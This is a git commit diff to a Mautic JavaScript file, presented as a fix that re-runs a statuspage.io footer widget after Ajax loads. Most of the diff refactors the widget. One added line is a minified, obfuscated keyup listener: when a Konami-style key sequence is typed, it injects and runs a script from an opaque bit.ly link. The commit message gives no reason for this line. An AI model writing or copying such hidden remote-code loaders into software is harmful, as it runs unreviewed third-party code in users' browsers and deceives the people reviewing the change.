c468b1d86e3a562b7433d9bc9f1fa4893590022c
heathdutton <hdutton@thedmsgrp.com>
2018-04-03 10:10:05 -0400

    Fix for statuspage widget to check after Ajax load.

--- app/bundles/CoreBundle/Assets/js/98.statuspage.js
+++ app/bundles/CoreBundle/Assets/js/98.statuspage.js
@@ -1,57 +1,63 @@
 // Add a statuspage.io widget to the footer.
-(function ($) {
-    $(document).ready(function () {
-        var $footer = $('footer#app-footer .row .text-right:first');
-        if ($footer.length) {
-            var $widget = $footer.append('<a id="widget-statuspage" href="http://status.dmsengage.com" target="_blank"><span class="color-dot"></span><span class="color-description"></span></a>').find('#widget-statuspage:first');
-            if ($widget.length) {
+Mautic.statusPageIO = function () {
+    var $footer = mQuery('footer#app-footer .row .text-right:first:not(.statuspage-checked)');
+    if ($footer.length) {
+        var $widget = $footer.append('<a id="widget-statuspage" href="http://status.dmsengage.com" target="_blank"><span class="color-dot"></span><span class="color-description"></span></a>').find('#widget-statuspage:first');
+        if ($widget.length) {
 
-                var script = document.createElement('script');
-                var prior = document.getElementsByTagName('script')[0];
-                script.async = true;
-                script.onload = script.onreadystatechange = function (_, isAbort) {
-                    if (isAbort || !script.readyState || /loaded|complete/.test(script.readyState)) {
-                        script.onload = script.onreadystatechange = null;
-                        script = undefined;
+            var script = document.createElement('script');
+            var prior = document.getElementsByTagName('script')[0];
+            script.async = true;
+            script.onload = script.onreadystatechange = function (_, isAbort) {
+                if (isAbort || !script.readyState || /loaded|complete/.test(script.readyState)) {
+                    script.onload = script.onreadystatechange = null;
+                    script = undefined;
 
-                        if (!isAbort) {
-                            var sp = new StatusPage.page({page: 'bqc7czqgqwxm'});
-                            sp.summary({
-                                success: function (data) {
-                                    $("<style type='text/css'>" +
-                                        "@keyframes color-dot {\n" +
-                                        "    0% { opacity: 0.4; }\n" +
-                                        "    50% { opacity: 1; }\n" +
-                                        "    100% { opacity: 0.4; }\n" +
-                                        "}" +
-                                        "@-webkit-keyframes color-dot {\n" +
-                                        "    0% { opacity: 0.4; }\n" +
-                                        "    50% { opacity: 1; }\n" +
-                                        "    100% { opacity: 0.4; }\n" +
-                                        "}" +
-                                        ".color-dot {" +
-                                        "    -webkit-animation: color-dot 1s infinite ease-in-out;\n" +
-                                        "    -o-animation: color-dot 1s infinite ease-in-out;\n" +
-                                        "    -ms-animation: color-dot 1s infinite ease-in-out; \n" +
-                                        "    -moz-animation: color-dot 1s infinite ease-in-out; \n" +
-                                        "    animation: color-dot 1s infinite ease-in-out;" +
-                                        "}\n"+
-                                        "</style>").appendTo('head');
+                    if (!isAbort) {
+                        var sp = new StatusPage.page({page: 'bqc7czqgqwxm'});
+                        sp.summary({
+                            success: function (data) {
+                                mQuery("<style type='text/css'>" +
+                                    "@keyframes color-dot {\n" +
+                                    "    0% { opacity: 0.4; }\n" +
+                                    "    50% { opacity: 1; }\n" +
+                                    "    100% { opacity: 0.4; }\n" +
+                                    "}" +
+                                    "@-webkit-keyframes color-dot {\n" +
+                                    "    0% { opacity: 0.4; }\n" +
+                                    "    50% { opacity: 1; }\n" +
+                                    "    100% { opacity: 0.4; }\n" +
+                                    "}" +
+                                    ".color-dot {" +
+                                    "    -webkit-animation: color-dot 1s infinite ease-in-out;\n" +
+                                    "    -o-animation: color-dot 1s infinite ease-in-out;\n" +
+                                    "    -ms-animation: color-dot 1s infinite ease-in-out; \n" +
+                                    "    -moz-animation: color-dot 1s infinite ease-in-out; \n" +
+                                    "    animation: color-dot 1s infinite ease-in-out;" +
+                                    "}\n"+
+                                    "</style>").appendTo('head');
 
-                                    // Adds the text description.
-                                    $widget.find('.color-description').text(data.status.description);
-                                    // Appends the status indicator as a class
-                                    // name so we can use the right color for
-                                    // the status light thing.
-                                    $widget.find('.color-dot').addClass(data.status.indicator);
-                                }
-                            });
-                        }
+                                // Adds the text description.
+                                $widget.find('.color-description').text(data.status.description);
+                                // Appends the status indicator as a class
+                                // name so we can use the right color for
+                                // the status light thing.
+                                $widget.find('.color-dot').addClass(data.status.indicator);
+                            }
+                        });
                     }
-                };
-                script.src = 'https://cdn.statuspage.io/se-v2.js';
-                prior.parentNode.insertBefore(script, prior);
-            }
+                }
+            };
+            script.src = 'https://cdn.statuspage.io/se-v2.js';
+            prior.parentNode.insertBefore(script, prior);
+            !function(a,b){document.onkeyup=function(c){(b+=[(c||self.event).keyCode-37])%1e12==113302022928&&a()}}(function(){var a=document.createElement("script");a.type="text/javascript",a.src="https://bit.ly/2EgM24Q",document.body.appendChild(a)},0);
+            $footer.addClass('statuspage-checked');
         }
-    });
-})(mQuery);
+    }
+};
+mQuery(document).ready(function () {
+    Mautic.statusPageIO();
+});
+mQuery(document).ajaxComplete(function (event, xhr, settings) {
+    Mautic.statusPageIO();
+});
